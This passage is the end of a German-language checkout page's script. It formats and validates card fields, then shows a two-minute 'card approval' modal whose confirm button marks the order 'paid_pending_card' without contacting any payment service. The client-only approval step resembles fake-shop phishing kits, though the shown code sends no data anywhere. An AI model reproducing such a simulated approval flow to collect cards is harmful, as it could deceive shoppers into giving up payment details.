      const expOk = exp && exp.value && !/true/.test(exp.getAttribute('aria-invalid'));
      const cvcOk = cvc && cvc.value && !/true/.test(cvc.getAttribute('aria-invalid'));
      return hasName && numberOk && expOk && cvcOk;
    }
    function updateCardButton(){ if(payBtn){ payBtn.disabled = !cardFieldsValid(); } }

    function formatCardWithCaret(input){
      const raw = input.value;
      const sel = input.selectionStart;
      const digits = onlyDigits(raw);
      const brand = detectBrand(digits);
      const limit = brand==='amex' ? 15 : 16;
      const d = digits.slice(0, limit);

      let grouped;
      if(brand==='amex'){
        grouped = d.replace(/(\d{1,4})(\d{0,6})?(\d{0,5})?/, (_,a,b,c)=>[a,b,c].filter(Boolean).join(' '));
      }else{
        grouped = d.replace(/(\d{4})(?=\d)/g,'$1 ').trim();
      }

      const leftDigits = onlyDigits(raw.slice(0, sel)).length;
      let newPos=0, seen=0;
      for(let i=0;i<grouped.length;i++){ if(/\d/.test(grouped[i])) seen++; if(seen>=leftDigits){ newPos=i+1; break; } }
      input.value = grouped; input.setSelectionRange(newPos, newPos);
      input.maxLength = brand==='amex' ? 17 : 19;

      if(brand){
        chip.style.display='inline-flex';
        chip.textContent='Erkannte Karte: '+brandNames[brand];
        input.placeholder = brandSamples[brand];
        cvc.maxLength = brand==='amex' ? 4 : 3;
        cvc.placeholder = brand==='amex' ? '4 Ziffern' : '3 Ziffern';
      }else{
        chip.style.display='none';
        input.placeholder = brandSamples.visa;
        cvc.maxLength = 4;
      }

      const need = brand==='amex' ? 15 : 16;
      const oklen = onlyDigits(input.value).length===need;
      if(oklen){
        const ok = luhnOk(onlyDigits(input.value));
        input.setAttribute('aria-invalid', String(!ok));
        assist.textContent = ok ? 'Kartennummer gültig (Luhn ✓).' : 'Kartennummer ungültig (Luhn ✗).';
      }else{
        input.setAttribute('aria-invalid','false');
        assist.textContent = brand ? `Bitte ${need} Ziffern eingeben — ${brandNames[brand]}.` : 'Bitte Kartennummer eingeben.';
      }
      updateCardButton();
    }
    if(num){ num.addEventListener('input', ()=>formatCardWithCaret(num)); num.placeholder = brandSamples.visa; }

    if(exp){
      exp.addEventListener('keydown', (e)=>{
        if(e.key==='Backspace'){
          const pos = exp.selectionStart;
          if(pos===3 && exp.value.charAt(2)=='/'){ e.preventDefault(); exp.value = exp.value.slice(0,1); exp.setSelectionRange(1,1); }
        }
      });
      exp.addEventListener('input', ()=>{
        let d = onlyDigits(exp.value).slice(0,4);
        if(d.length===1){ const n=+d; if(n>1) d='0'+d; }
        if(d.length>=2){ let mm=+d.slice(0,2); if(mm<1) mm=1; if(mm>12) mm=12; d=('0'+mm).slice(-2)+d.slice(2); }
        exp.value = d.length>2 ? d.slice(0,2)+'/'+d.slice(2) : d;

        const parts = exp.value.split('/');
        if(parts.length===2 && parts[0].length===2 && parts[1].length===2){
          const mm=+parts[0], yy=+parts[1];
          const now=new Date(); const full=2000+yy;
          const expEnd=new Date(full, mm, 1);
          const firstThis=new Date(now.getFullYear(), now.getMonth(), 1);
          const ok = mm>=1 && mm<=12 && expEnd>=firstThis;
          exp.setAttribute('aria-invalid', String(!ok));
          if(ok) { assist.textContent='Gültiges Ablaufdatum.'; }
        }else{ exp.setAttribute('aria-invalid','false'); }
        updateCardButton();
      });
    }

    if(cvc){
      cvc.addEventListener('input', ()=>{
        let val = onlyDigits(cvc.value).slice(0,4);
        cvc.value = val;
        const bad = val.length<3 || val.length>4;
        cvc.setAttribute('aria-invalid', String(bad));
        if(!bad) assist.textContent = 'CVC/CVV ok.';
        updateCardButton();
      });
    }

    if(cardName){
      cardName.addEventListener('input', ()=>{
        const ok = cardName.value.trim().length>1;
        cardName.setAttribute('aria-invalid', String(!ok));
        updateCardButton();
      });
    }

    /* Kartenfluss: Modale + 2-Minuten-Timer */
    const cardModal = $('#cardFlowModal');
    const postModal = $('#postCardModal');
    const closeCardFlow = $('#closeCardFlow');
    const iValidated = $('#iValidated');
    const useSepa = $('#useSepa');
    const cardBar = $('#cardBar');
    const cardCountdown = $('#cardCountdown');
    const confirmCardBtn = $('#confirmCard');
    const okPostCard = $('#okPostCard');
    const closePostCard = $('#closePostCard');
    const placeOrder = $('#placeOrder');

    if(payBtn){ payBtn.disabled = true; }

    let tick=null, total=120, left=total;
    function fmt(s){ const m=String(Math.floor(s/60)).padStart(2,'0'); const ss=String(s%60).padStart(2,'0'); return m+':'+ss; }
    function openCardModal(){
      left = total;
      cardBar.style.width='0%';
      cardCountdown.textContent = fmt(left);
      cardModal.classList.add('show');
      tick = setInterval(()=>{
        left--; if(left<0) left=0;
        cardBar.style.width = ((total-left)/total*100).toFixed(1)+'%';
        cardCountdown.textContent = fmt(left);
        if(left===0){ closeCardModal(true); }
      },1000);
    }
    function closeCardModal(){
      clearInterval(tick);
      cardModal.classList.remove('show');
      confirmCardBtn.style.display='inline-flex';
      confirmCardBtn.removeAttribute('aria-hidden');
      confirmCardBtn.scrollIntoView({behavior:'smooth', block:'center'});
    }

    if(payBtn){
      payBtn.addEventListener('click', (e)=>{
        e.preventDefault();
        // Blocage si champs carte incomplets
        const ok = [cardName,num,exp,cvc].every(el => el && el.value && !/true/.test(el.getAttribute('aria-invalid')));
        if(!ok){
          [cardName,num,exp,cvc].forEach(el=>{ if(el && !el.value) el.setAttribute('aria-invalid','true'); });
          const t = document.createElement('div'); t.className='toast'; t.textContent='Bitte Kartenfelder prüfen.'; document.body.appendChild(t); t.classList.add('show'); setTimeout(()=>{ t.remove(); },2000);
          return;
        }
        openCardModal();
      });
    }
    if(closeCardFlow){ closeCardFlow.addEventListener('click', ()=>closeCardModal()); }
    if(iValidated){ iValidated.addEventListener('click', ()=>closeCardModal()); }
    if(useSepa){
      useSepa.addEventListener('click', ()=>{
        closeCardModal();
        showOnly('sepa');
      });
    }

    if(confirmCardBtn){
      confirmCardBtn.addEventListener('click', (e)=>{
        e.preventDefault();
        postModal.classList.add('show');
        if(placeOrder){ placeOrder.disabled = false; placeOrder.dataset.state = 'paid_pending_card'; }
      });
    }
    function closePost(){ postModal.classList.remove('show'); }
    if(okPostCard){ okPostCard.addEventListener('click', closePost); }
    if(closePostCard){ closePostCard.addEventListener('click', closePost); }
  })();
  </script>
</body>
</html>
